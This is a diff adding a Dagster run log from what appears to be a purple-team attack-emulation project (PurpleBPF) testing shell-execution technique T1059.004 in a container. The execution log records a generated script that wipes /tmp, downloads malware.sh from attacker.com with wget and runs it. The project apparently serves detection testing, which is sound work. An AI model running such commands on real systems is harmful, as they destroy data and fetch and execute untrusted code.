@@ -1,0 +1,60 @@
+[32m2026-08-15 22:28:47 +0900[0m - dagster - [34mDEBUG[0m - __ASSET_JOB - 43463bee-1f81-458b-8c0a-255094733d26 - 44188 - LOGS_CAPTURED - Capturing logs for process (pid: 44188).
+[32m2026-08-15 22:28:47 +0900[0m - dagster - [34mDEBUG[0m - __ASSET_JOB - 43463bee-1f81-458b-8c0a-255094733d26 - 44188 - run_attack_round - STEP_START - Started execution of step "run_attack_round".
+[32m2026-08-15 22:28:47 +0900[0m - dagster - [34mINFO[0m - __ASSET_JOB - 43463bee-1f81-458b-8c0a-255094733d26 - run_attack_round - [run_attack_round] 실행: limactl shell default -- bash -c cd /Users/kwonjunhui/Desktop/PurpleBPF && source ~/purplebpf.env && python3 -m purplebpf.offensive.executor.executor T1059.004
+[32m2026-08-15 22:29:21 +0900[0m - dagster - [34mINFO[0m - __ASSET_JOB - 43463bee-1f81-458b-8c0a-255094733d26 - run_attack_round - [run_attack_round] returncode=0
+[32m2026-08-15 22:29:21 +0900[0m - dagster - [34mINFO[0m - __ASSET_JOB - 43463bee-1f81-458b-8c0a-255094733d26 - run_attack_round - [run_attack_round] stdout:
+=== 1차 필터 판정 ===
+{
+  "verdict": "PASS",
+  "checks": {
+    "structure": {
+      "passed": true,
+      "issues": []
+    },
+    "syntax": {
+      "passed": true,
+      "issues": [
+        {
+          "level": "warning",
+          "message": "shellcheck가 설치되어 있지 않아 문법 검사를 건너뛴다."
+        }
+      ]
+    },
+    "ordering": {
+      "passed": true,
+      "issues": []
+    }
+  },
+  "reasons": []
+}
+=== 실행 결과 (execution_log 기록) ===
+{
+  "run_id": 7,
+  "round_id": 1,
+  "chain_id": "3416c1e2-4806-413f-8d7e-00f0c7eb90a8",
+  "technique": "T1059.004",
+  "channel": "syscall",
+  "success": true,
+  "started_at": "2026-08-15 13:29:21.057875+00:00",
+  "finished_at": "2026-08-15 13:29:21.097947+00:00",
+  "container_id": "d0d3793817ac",
+  "created_at": "2026-08-15 13:29:21.199128+00:00",
+  "step_results": [
+    {
+      "order": 1,
+      "command": "echo '#!/bin/bash\nrm -rf /tmp/* && wget http://attacker.com/malware.sh && chmod +x malware.sh && ./malware.sh' > /tmp/execute_script.sh",
+      "exit_code": 0,
+      "output": ""
+    },
+    {
+      "order": 2,
+      "command": "chmod +x /tmp/execute_script.sh",
+      "exit_code": 0,
+      "output": ""
+    }
+  ]
+}
+
+[32m2026-08-15 22:29:21 +0900[0m - dagster - [34mDEBUG[0m - __ASSET_JOB - 43463bee-1f81-458b-8c0a-255094733d26 - 44188 - run_attack_round - STEP_OUTPUT - Yielded output "result" of type "Any". (Type check passed).
+[32m2026-08-15 22:29:21 +0900[0m - dagster - [34mDEBUG[0m - __ASSET_JOB - 43463bee-1f81-458b-8c0a-255094733d26 - 44188 - run_attack_round - ASSET_MATERIALIZATION - Materialized value run_attack_round.
+[32m2026-08-15 22:29:21 +0900[0m - dagster - [34mDEBUG[0m - __ASSET_JOB - 43463bee-1f81-458b-8c0a-255094733d26 - 44188 - run_attack_round - STEP_SUCCESS - Finished execution of step "run_attack_round" in 34.3s.
